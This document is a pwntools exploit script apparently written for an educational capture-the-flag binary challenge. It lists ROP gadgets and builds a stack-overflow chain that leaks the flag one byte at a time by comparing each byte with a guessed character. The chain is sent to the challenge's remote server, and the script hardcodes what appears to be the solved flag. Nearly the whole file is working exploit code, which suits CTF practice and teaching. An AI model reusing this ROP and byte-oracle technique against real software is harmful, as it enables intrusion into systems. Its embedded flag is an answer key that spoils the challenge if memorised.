#!/usr/bin/env python3

from pwn import *

exe = ELF("chal_patched")

context.binary = exe

'''
0x0000000000458237 : pop rax ; ret
0x000000000040171f : pop rdx ; ret
0x0000000000401812 : pop rdi ; ret
0x00000000004021e7 : pop rsp ; ret
0x0000000000401fa0 : xor eax, eax ; pop rbx ; ret
0x0000000000481b45 : loopne 0x481b4a ; jmp 0x48189a (loop use rce)

cmp series 
0x0000000000438c36 : cmp byte ptr [rax], dl (edx) ; ret
0x0000000000421498 : and byte ptr [rax + 1], cl (ecx); ret
0x000000000043a02d : cmp byte ptr [rdi], dl ; ret
0x000000000045dcea : xor r8d, r8d ; call rbx
0x000000000045849b : test rax, rax ; je 0x4584a1 ; ret
0x0000000000413733 : xor byte ptr [rbx - 0x78f0fd07], al ; ret
0x00000000004a1e9a : test rbx, rbx ; jne 0x4a1e80 ; pop rbx ; ret (here will segmentation fault ba)
0x0000000000489df2 : mov eax, dword ptr [rcx] ; ret

jmp series
0x000000000047fbf0 : je 0x47fc10 ; ret
0x000000000047d48d : je 0x47d490 ; ret (will halt)
0x000000000047d4f1 : je 0x47d4f4 ; ret

0x0000000000431731 : wait ; xor eax, dword ptr [rdx] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000045dcea : xor r8d, r8d ; call rbx
0x00000000004021e7 : pop rsp ; ret
0x0000000000434d47 : imul edx, dword ptr [rax], 0x894d0000 ; retf
0x000000000042201e : fmul dword ptr [rax - 0x77] ; ret
0x0000000000401c2e : jmp rax ; ret
0x0000000000413621 : xchg esp, eax ; ret
0x0000000000402faf : mov eax, esp ; pop r12 ; ret
0x0000000000438c23 : add rax, rdi ; ret
0x0000000000427e48 : mov qword ptr [rdx], rax ; ret
0x0000000000448126 : mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x00000000004158d1 : xor ecx, ecx ; pop rbx ; pop rbp ; mov rax, r9 ; pop r12 ; ret
'''

# store
mov_eax_esp = 0x0000000000402faf
store_rdx_rax = 0x0000000000427e48

# load 
load_rax_rdx = 0x0000000000448126
xchg_eax_esp = 0x0000000000413621
clear_rcx = 0x00000000004158d1 # need 3 variables

pop_rax = 0x0000000000458237
pop_rbx = 0x0000000000401fa0
pop_rdx = 0x000000000040171f
pop_rdi = 0x0000000000401812
pop_rsp = 0x00000000004021e7
cmp_rax_dl = 0x0000000000438c36
jmp_break = 0x000000000047d48d
add_rax_rdi = 0x0000000000438c23
wait = 0x0000000000431731
#test = 0x000000000045dcea
test = 0x000000000042201e


#p = process('./chal_patched')
p = remote('edu-ctf.zoolab.org','10012')

flag = 0x000000004de2e0
main = 0x401cb5
write_memory = 0x000000004dc000

FLAG_C = 'FLAG{CORORO_f8b7d5d23ad03512d6687384b7a2a500}'
i = 44

# pop_rax, {index}
# pop_rdx, {guess character}
payload = flat(
    b'A' * 8, b'A' * 8,
    b'A' * 8, b'A' * 8, b'A' * 8,
    pop_rbx, main,
    pop_rax, flag + i,
    pop_rdx, ord("}"),
    cmp_rax_dl,
    jmp_break,

    pop_rdx, write_memory,
    pop_rax, pop_rsp,
    store_rdx_rax,
    pop_rdx, write_memory + 8,
    pop_rax, write_memory,
    store_rdx_rax,
    pop_rsp, write_memory,
)


for i in range(900):
    payload += p64(test)

#raw_input('>')
p.sendline(payload)
#raw_input('>')
p.interactive()